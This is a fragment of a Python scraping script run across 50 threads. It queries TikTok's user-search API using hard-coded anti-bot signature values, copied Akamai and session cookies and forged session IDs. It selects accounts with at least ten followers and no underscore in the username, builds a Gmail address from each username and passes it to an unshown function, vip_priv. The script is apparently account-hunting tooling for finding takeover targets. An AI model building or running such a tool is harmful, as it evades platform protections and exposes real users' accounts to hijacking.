                luffys = requests.get(f'https://www.tiktok.com/api/search/user/full/?aid=1988&app_language=tr&app_name=tiktok_web&battery_info=0.84&browser_language=tr-IQ&browser_name=Mozilla&browser_online=true&browser_platform=Linux%20aarch64&browser_version=5.0%20%28X11%3B%20Linux%20x86_64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F106.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&cursor=0&device_id=7136188745632548358&device_platform=web_pc&focus_state=true&from_page=search&history_len=40&is_fullscreen=false&is_page_visible=true&keyword=luffys&os=linux&priority_region=&referer=&region=IQ&screen_height=796&screen_width=360&tz_name=Avrupa%2Fİstanbul&verifyFp=verify_l9zrjkcx_XSZCv5U7_xzys_4UEP_8m1a_TibJS3izVTHL&webcast_language=tr&msToken=qfFKcpRIe_b543Hfa7buaE31PLWDv6-_TQYqevIaTVOPrUNjuwuHR2z0_cEadFELKqD9p6fLuWk8tgAO9lDmVCUX4vqnit3V4rX9zvJfLCbhs9U2apBgYHmKpXPp6DLl2wZy35z0xD6g6TSu_NIh&X-Bogus=DFSzswVLk-tANxW1S02v8OxPBxgg&_signature=_02B4Z6wo00001IuO8aAAAIDBSFHuFzoQUMCLjvUAAEGFfa',headers=he3)
                msToken = luffys.cookies.get_dict()['msToken']
                headers={'accept':'*/*','accept-language':'en-US,en;q=0.9','cache-control':'no-cache','pragma':'no-cache','priority':'u=1, i','sec-ch-ua':'"Not)A;Brand";v="99","Microsoft Edge";v="127","Chromium";v="127"','sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"','sec-fetch-dest':'empty','sec-fetch-mode':'cors','sec-fetch-site':'same-origin','user-agent':he3["User-Agent"]}
                params={'WebIdLastTime':'1715883147',    'aid':'1988','app_language':'en','app_name':'tiktok_web','browser_language':'en-US','browser_name':'Mozilla','browser_online':'true','browser_platform':'Win32','browser_version':he3["User-Agent"],'channel':'tiktok_web','cookie_enabled':'true','cursor':'220','data_collection_enabled':'false','device_id':idd6,'device_platform':'web_pc','focus_state':'true','from_page':'search','history_len':'5','is_fullscreen':'false','is_page_visible':'true','keyword':f'{keyword}','odinId':'7369661640164000774','os':'windows','priority_region':'','referer':'','region':'PE','screen_height':'864','screen_width':'1536','search_id':'20240801154310BA7846F9CDEDD312B464','tz_name':'Asia/Baghdad','user_is_login':'false','web_search_code':'{"tiktok":{"client_params_x":{"search_engine":{"ies_mt_user_live_video_card_use_libra":1,"mt_search_general_user_live_card":1}},"search_server":{}}}','webcast_language':'en','msToken':msToken,'X-Bogus':'DFSzswVLRekANHWvtvtx-ShPmkfD','_signature':'_02B4Z6wo00001nO.kIwAAIDCAGLSLe4xtvJzv5QAAPpT70'}
                ses=str(uuid4()).replace('-', '')
                cookies = {
                    'cookie': f'passport_csrf_token=446c23e1b656077bd01b1f379ff01c64; passport_csrf_token_default=446c23e1b656077bd01b1f379ff01c64; tiktok_webapp_theme=dark; cookie-consent="ga":true,"af":true,"fbp":true,"lip":true,"bing":true,"ttads":true,"reddit":true,"version":"v8"; _ttp=2HZr0KnJ2pqKwJRyQ8myJ28Lpa8; __tea_cache_tokens_1988="user_unique_id":"7160599742786815489","timestamp":1667850947815,"_type_":"default"; passport_auth_status=c8fe9febc06f8f7a271309fa9e4f80e9,; passport_auth_status_ss=c8fe9febc06f8f7a271309fa9e4f80e9,; tt_csrf_token=CSVYu9wW-NbmqJ_cgNMHwEIItUNZGwDPM-hU; tt_chain_token=K01fXiH8q/IKwxFnx8jzcA==; _abck=951F354EE38142028A7429E8C92DB598~0~YAAQVvvOF6YBsxSFAQAAMc+wPgl24s0qz4P3iMup3WLL4PWyu/iF6+jb4qL2RfvMEKOGTv6dPfAH9AA2Hm+t/Z/Qn1TlkKHzKXk+KmuWj5d1dmCzqXD0BWgAUcMFCLRinQHou0lzh0ImXOw3B98dRIVnofWMwN8L8JxOErAxrQfi2JIEgTjNECxiZFYaqhpfLqyAUXBESaQxfCYfbNwLNwAAZvjpAfc1viGc/I9vlRIeVc2jYPA5/YUVwAytWPIOb2RuvdrXc2bfybwD3ffG0godURyE+r0QSJapjZK7kfVwbPGnVLal0dzAQM6MK2iDC5YhXugMYw9ZXB2CIaYRg4Cqy/t6BabKM9i+ZJgdvwWQQ6ljnk0pa1bKBsAYL79BxNMrQWccpQxQhUm9n09604O82PBKq8E=~-1~-1~-1; bm_sz=304AE404FA2929B0E90042E8314D20CA~YAAQVvvOF6kBsxSFAQAAMc+wPhIfC1eYkaU2YudlghSK8pNrkVcLYapeM/xrzvQbQkT9quFNwKNHsG4xkv6anwuDXn+BSd+gzoBWSdRZJscGEzPghGpbTStjyG61DtaJIqpkgjW7q6BEP37XgXgrWfHRdmoN5zraADDH7wpkIQ3UlBq5rj88cFl1IY4CUg2DSRugvtjKk+vcNV5AUjQ++v859Tv3vYF3Ga6m5lifIf0u50u/dC1xeVz0p4ew+7U21dwrDdNrai63bM7T9ArdMNk1q+2YK55FJU7tdQwtKtdLtnI=~4407620~4277556; ak_bmsc=EE17F7D340A941EB628DF68B5981EA8D~000000000000000000000000000000~YAAQVvvOF/8BsxSFAQAAS/SwPhJbeUd2XpuVnfaiGo9WDUNsMw3AUn4T4r4BtvFH6pwejSxQJ/K4aoQUK/hGU8InWjW8iSyWgKZxkNIl6lgAAvUdX8CiKcyfyQKJYfQcPDyxW6dnF6+VF2/BABsRcYTw9LUX6MjuhvgtLs1uh3AbWeHxdZFDhp/YYwjrPxoOEXgItQjGUSsxRhgRubItrsXwhW20gW9y+I7Eq22TORlAZOn+jyrl2bYH6C4yxD8yld+5OcSAQ3zKJfQLUjNj03BMgtlIyYT74OIh6GwUzgtjpGLUCzpqdeiOFZdfZApTnRoTK9J01CpUY+YxrThJKz4dScjK1V78LSd2CkfUakgFa7TXfZ1fgfPX/RW2nkWTe9SZtvDH3f62qd9b5oNojffOAM0fpnNeX06hNWSNDRRuiHOmv3m49PN2cJhknh753LdNdt81kj8LJ3SEe1y3sfHb0nPwafPExOaSSrXviHwj4+yLWrZw+dXy3Q==; sid_guard=5d52768f6a4a876314ea37244edfd0d0|1671794088|21600|Fri,+23-Dec-2022+17:14:48+GMT; uid_tt={ses[:16]}; uid_tt_ss={ses[:16]}; sid_tt={ses}; sessionid={ses}; sessionid_ss={ses}; sid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; ssid_ucp_v1=1.0.0-KDM1ZGU2ODk4YzcyNDJkMzUxNWRiMTVlMzc3OTMyZTNlY2JlYWYwYWMKCRCom5adBhizCxADGgZtYWxpdmEiIDVkNTI3NjhmNmE0YTg3NjMxNGVhMzcyNDRlZGZkMGQw; bm_sv=F556D2E15739C190D1B417337724D81E~YAAQVvvOF8ACsxSFAQAAaICxPhJ1QOpVK0jJSh0nuEay3Iz+L/0up1OoP09MVnndgBSzTjunJoYxBBQH4BTuDkQIQY+zt9kedbGoP5/7AUt2jVEq7DfEwQYdr31ZvZiHlhdU2Q5jwNvbZvNzQSokkwHoGbPqes9c4kV0ZGJuEuWc3pLurp0dkRkEBTY0UrcljYpQayw5/w7+4BlpmrMR5UAHElAGf2njGNpz3vRls+WGkTy9l8jRTCEseWkwnA9X~1; ttwid='+ttwid+'; odin_tt=70015f10b12827e4d2b9cce32ead78da9bd1f5af11487a83ba408d86d9a4fb55ec780a14ad91b601d9fe256fcb8160786311c12ef294e6bf285fbbf7eed8dff8080f26ed1bcedbdfca7244743dcbc60e; msToken='+msToken+'; msToken='+msToken+'; s_v_web_id=verify_lc0f2h1w_v9MWasYr_Uw4b_4j2o_8gdZ_QkWrSxI57MTt',
                    'pragma': 'no-cache',
}
                try:
                	response = requests.get('https://www.tiktok.com/api/search/user/full/', params=params, headers=headers,cookies=cookies).json()               
                except:
                	continue
                for users in response['user_list']:
                    ud = (users['user_info']['uid'])
                    user=(users['user_info']['unique_id'])
                    fol =(users['user_info']['follower_count'])
                    if int(fol)>=10:
                    	pass
                    else:
                    	continue
                    if '_' in user:
                    	continue
                    else:
                    	pass
                    email=user+'@gmail.com'
                    vip_priv(email)                    	   
            except:pass
for i in range(50):
    threading.Thread(target=luffy_shelby).start()              

    